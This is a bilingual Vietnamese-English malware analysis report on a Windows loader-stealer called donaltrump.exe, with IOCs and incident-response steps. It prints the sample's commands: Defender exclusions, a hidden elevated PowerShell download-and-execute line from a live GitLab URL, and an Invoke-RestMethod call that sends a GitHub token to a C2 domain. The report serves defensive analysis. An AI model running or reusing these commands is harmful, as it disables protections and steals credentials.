---
title: Phân tích donaltrump.exe – Malware Loader kết hợp Stealer dùng PowerShell fileless, né Defender và đánh cắp GitHub Token
titleEn: Analysis of donaltrump.exe – A Loader-Stealer Using Fileless PowerShell, Defender Evasion, and GitHub Token Theft
excerpt: donaltrump.exe là malware dạng Loader + Stealer nhắm Windows, dùng PowerShell ExecutionPolicy Bypass để tải và chạy payload trong bộ nhớ, thêm Defender exclusion để né quét, tạo Scheduled Task giả danh Edge để persistence và exfiltrate GitHub token ra C2.
excerptEn: donaltrump.exe is a Windows Loader-Stealer that abuses PowerShell ExecutionPolicy Bypass to download and execute payload in-memory, adds Defender exclusions for evasion, creates an Edge-masqueraded Scheduled Task for persistence, and exfiltrates GitHub tokens to a C2 endpoint.
date: 03-01-2026
author: Thagore Security Team
tags: ["malware-analysis", "loader", "stealer", "powershell", "fileless", "defender-evasion", "scheduled-task", "lolbins", "credential-theft", "incident-response"]
image: /content/donaltrump-exe.png
---

# Phân tích donaltrump.exe: Loader + Stealer kiểu “fileless”, né Defender và đánh cắp GitHub Token

**Threat Level (Mức độ đe doạ):** High ⚠️  
**Classification (Phân loại):** Malware Loader · Information Stealer · Defender Evasion · Persistence  
**Platform (Nền tảng):** Windows  
**Verdict (Kết luận):** Malicious

> **Thagore Security Team – Nhận định nhanh:** “Mẫu này là loader/stealer thực chiến: chạy PowerShell ẩn → né Defender bằng exclusion → tạo Scheduled Task giả danh Edge → tải payload từ xa và exfiltrate token. Nếu đã chạy, coi như máy đã bị compromise.”

---

## 1) Executive Summary (Tóm tắt điều tra)

donaltrump.exe được phân loại là **Malware Loader kết hợp Stealer**, tập trung vào hai mục tiêu chính: (1) thiết lập môi trường chạy an toàn cho payload bằng cách làm suy yếu Defender, (2) tải/thực thi payload động từ Internet và đánh cắp thông tin nhạy cảm (đặc biệt là GitHub token). Chuỗi thực thi thể hiện phong cách “fileless” (không ghi payload xuống đĩa) thông qua `Invoke-WebRequest` + `Invoke-Expression`, kết hợp LOLBins và persistence dạng Scheduled Task để tồn tại lâu dài. :contentReference[oaicite:1]{index=1}

| Hạng mục | Observed | Ý nghĩa |
|---|---|---|
| Infection vector (Lây nhiễm) | File EXE từ Internet/Discord | Dễ phát tán qua share cộng đồng |
| Execution | PowerShell hidden + ExecutionPolicy Bypass | Fileless execution, giảm dấu vết |
| Defense evasion | Add-MpPreference exclusions | Làm suy yếu Windows Defender |
| Persistence | Scheduled Task giả danh Edge | Tự chạy lại khi login, quyền cao |
| Loader | Tải payload từ GitLab | Payload có thể thay đổi bất kỳ lúc nào |
| Stealer | Lấy `$env:GITHUB_TOKEN_VPS` | Chiếm GitHub/CI/CD/VPS |
| Exfil | `Invoke-RestMethod` về domain động | C2/exfil rõ ràng |

---

## 2) Execution Chain (Chuỗi thực thi)

Mẫu được kích hoạt bởi người dùng, sau đó lập tức gọi PowerShell với tham số “đúng sách malware”: `-NoProfile`, `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`. Đi kèm là ép `conhost.exe` chạy ở **ForceV1** (một kỹ thuật giúp giảm tương thích với một số cơ chế giám sát console mới). Malware dùng `Invoke-WebRequest` để tải nội dung từ Internet và `Invoke-Expression` để chạy trực tiếp trong bộ nhớ — đây là pattern fileless điển hình vì payload không cần lưu xuống disk. :contentReference[oaicite:2]{index=2}

| Bước | Thành phần | Dấu hiệu | Ý nghĩa |
|---:|---|---|---|
| 1 | User | chạy `donaltrump.exe` | điểm bắt đầu |
| 2 | PowerShell | `-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden` | tránh policy + chạy ẩn |
| 3 | Conhost | `ForceV1` | né giám sát/compat trick |
| 4 | Download | `Invoke-WebRequest` | kéo script/payload |
| 5 | In-memory exec | `Invoke-Expression` | fileless, khó forensic |

> **Thagore note:** “`iwr` + `iex` là combo kinh điển. Thấy là biết nó định chạy script trong RAM cho khó bắt.”

---

## 3) Defense Evasion (Né bảo mật / Defender Evasion)

Mẫu chủ động chỉnh cấu hình Defender bằng `Add-MpPreference` để thêm **exclusion** theo process và path. Đây là hành vi cực kỳ nguy hiểm vì nó biến Defender thành “đứng nhìn”. Cụ thể, nó loại trừ quét cho `powershell.exe`, `app.exe` và loại trừ đường dẫn `APPDATA\Microsoft\app.exe`. :contentReference[oaicite:3]{index=3}

| Technique (Kỹ thuật) | Command | Tác động |
|---|---|---|
| Defender exclusion (Loại trừ Defender) | `Add-MpPreference -ExclusionProcess "powershell.exe"` | PowerShell chạy không bị quét |
| Defender exclusion | `Add-MpPreference -ExclusionProcess "app.exe"` | Payload được “bảo kê” |
| Exclusion path | `Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\app.exe"` | File ở AppData tránh scan |

**Giải thích:** phần mềm hợp pháp gần như **không bao giờ** tự ý thêm exclusion vào Defender. Đây là dấu hiệu “thực chiến” rõ ràng.

---

## 4) Self-Copy & Hide (Tự sao chép và ẩn file)

Sau bước evasion, malware tự sao chép nó vào:

```
%APPDATA%\Microsoft\app.exe

```

Sau đó gán thuộc tính **Hidden** và **System** để khó thấy trong Explorer. Mục tiêu là giả mạo như file hệ thống và giảm khả năng người dùng phát hiện thủ công. :contentReference[oaicite:4]{index=4}

| Artifact | Path | Purpose (Mục tiêu) |
|---|---|---|
| Dropped copy | `%APPDATA%\Microsoft\app.exe` | bản payload/persistence |
| Attributes | `Hidden`, `System` | ẩn khỏi user, giả hệ thống |

---

## 5) Persistence (Duy trì tồn tại) bằng Scheduled Task giả danh Edge

Đây là điểm “đáng tiền”: malware tạo Scheduled Task tên **AppService**, nhưng đặt đường dẫn dưới nhánh:

```
\Microsoft\Windows\Edge

````

Trigger là **AtLogOn** (mỗi lần đăng nhập), và RunLevel là **Highest** (quyền cao nhất). Kỹ thuật này đánh lừa người kiểm tra vì nhìn như task của Edge. :contentReference[oaicite:5]{index=5}

| Thuộc tính | Giá trị | Ý nghĩa |
|---|---|---|
| Task Name | `AppService` | tên “hợp lý” |
| Task Path | `\Microsoft\Windows\Edge` | giả danh Edge |
| Trigger | `AtLogOn` | tự chạy khi login |
| RunLevel | `Highest` | chạy quyền cao |

> **Thagore note:** “Nhiều người chỉ nhìn Task Scheduler theo tên. Nó đặt dưới Edge là đúng bài ngụy trang.”

---

## 6) Loader Behavior (Downloader/Loader) – Tải payload động từ GitLab

Sau khi có persistence, malware tiếp tục gọi PowerShell ẩn với yêu cầu nâng quyền:

```powershell
Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a -UseBasicParsing)"
````

Điểm nguy hiểm nhất là **payload tải động**: attacker có thể thay file `a` bất kỳ lúc nào, nghĩa là hôm nay là stealer, ngày mai có thể là ransomware hoặc miner. 

| Indicator        | Value                                                   |
| ---------------- | ------------------------------------------------------- |
| Remote payload   | `https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a` |
| Execution style  | `iwr` + `iex` (in-memory)                               |
| Privilege prompt | `-Verb runAs`                                           |

---

## 7) Credential Theft (Đánh cắp thông tin) – nhắm vào GitHub Token

Mẫu thu thập token từ biến môi trường:

```
$env:GITHUB_TOKEN_VPS
```

Sau đó gửi về máy chủ điều khiển bằng:

```
Invoke-RestMethod "https://ancuopvpscongkhai.wvxx.dpdns.org/xd.php?token=$tok"
```

Đây là dấu hiệu cực rõ của **Credential/Secret Exfiltration** (trộm secret và gửi ra ngoài). Với GitHub token, hậu quả có thể lan tới CI/CD, private repo, VPS secrets và cả hạ tầng production. 

| Target       | Technique                        | Impact                            |
| ------------ | -------------------------------- | --------------------------------- |
| GitHub Token | đọc từ env var + exfil qua HTTP  | takeover GitHub, CI/CD compromise |
| VPS Secret   | token “VPS” gợi ý quyền quản trị | attacker có thể kiểm soát VPS     |

> **Thagore note:** “Nó không lấy password kiểu truyền thống. Nó nhắm token/secret – đúng kiểu tấn công hiện đại.”

---

## 8) LOLBins Abuse (Living-off-the-Land Binaries) – lạm dụng `slui.exe`

Mẫu gọi:

```
C:\Windows\System32\slui.exe -Embedding
```

`slui.exe` là binary hợp pháp có chữ ký Microsoft (Windows Licensing UI). Việc lạm dụng LOLBin giúp malware:

* giảm mức nghi ngờ
* lợi dụng tiến trình hợp pháp để che hành vi
* tăng khả năng bypass một số sandbox/heuristic

| LOLBin     | Command               | Purpose                                   |
| ---------- | --------------------- | ----------------------------------------- |
| `slui.exe` | `slui.exe -Embedding` | masquerade + evade sandbox/EDR heuristics |

---

## 9) IOC – Indicators of Compromise (Dấu hiệu nhận diện)

### 9.1 File/Path IOC

| Type | IOC                           |
| ---- | ----------------------------- |
| File | `%APPDATA%\Microsoft\app.exe` |

### 9.2 Task/Process IOC

| Type           | IOC                                            |
| -------------- | ---------------------------------------------- |
| Scheduled Task | `AppService` (Path: `\Microsoft\Windows\Edge`) |
| Process        | `powershell.exe` (NoProfile/Bypass/Hidden)     |
| Process        | `conhost.exe` (ForceV1)                        |
| LOLBin         | `slui.exe -Embedding`                          |

### 9.3 Network IOC

| Type            | IOC                                             |
| --------------- | ----------------------------------------------- |
| Payload hosting | `gitlab.com/haingng16/sigmatoilet/-/raw/main/a` |
| C2/Exfil        | `ancuopvpscongkhai.wvxx.dpdns.org`              |

---

## 10) Impact Analysis (Tác động & kịch bản xấu)

Mẫu này không chỉ “lây nhiễm”, mà còn hướng đến việc **chiếm quyền hệ thống và chiếm quyền account**. Với GitHub token, attacker có thể:

* push code độc hại vào repo
* lộ source
* lạm dụng CI/CD để phát tán
* lấy secrets (AWS keys, SSH keys, API tokens)
* từ GitHub → pivot sang VPS/production

**Điểm nguy hiểm đặc biệt:** payload từ GitLab có thể thay đổi, nên hành vi hôm nay không đảm bảo là toàn bộ hành vi của mẫu trong tương lai.

---

## 11) Recommended Response (Khuyến nghị xử lý)

### 11.1 Nếu CHƯA chạy file

| Hành động                  | Mục tiêu      |
| -------------------------- | ------------- |
| Xoá file + dọn Recycle Bin | ngăn chạy     |
| Quét Defender/EDR          | xác nhận sạch |
| Block IOC domain           | phòng ngừa    |

### 11.2 Nếu ĐÃ chạy file (Incident Response)

| Ưu tiên | Hành động                           | Ghi chú                                      |
| ------: | ----------------------------------- | -------------------------------------------- |
|       1 | Ngắt mạng ngay                      | ngăn exfil                                   |
|       2 | Xoá Scheduled Task `AppService`     | gỡ persistence                               |
|       3 | Gỡ toàn bộ Defender exclusions      | phục hồi phòng thủ                           |
|       4 | Xoá `%APPDATA%\Microsoft\app.exe`   | remove dropped payload                       |
|       5 | Reset GitHub token + rotate secrets | bắt buộc                                     |
|       6 | Defender Offline Scan/Rescue Disk   | quét ngoài OS                                |
|       7 | Nghiêm trọng                        | backup dữ liệu cần thiết → reinstall Windows |

> **Thagore Security Team – Kết luận xử lý:** “Mẫu này đủ điều kiện để xử lý như compromise. Ưu tiên rotate token/secrets vì dữ liệu có thể đã bị exfil ngay khi chạy.”

---

## 12) Kết luận (Conclusion)

**donaltrump.exe** là **malware loader + stealer** có hành vi rõ ràng:
**Defender evasion → persistence (task) → tải payload (GitLab) → đánh cắp token (GitHub) → exfiltration (dpdns).**
Đây không phải “tool thử nghiệm”, mà là mẫu có chủ đích, nhắm vào quyền kiểm soát hệ thống và dữ liệu nhạy cảm. 

---
## Lưu ý
*Báo cáo này là phân tích độc quyền từ **Thagore Security Team**; không sao chép khi chưa có sự cho phép, được phép đăng lại nếu **ghi rõ nguồn/credit Thagore Security Team**.*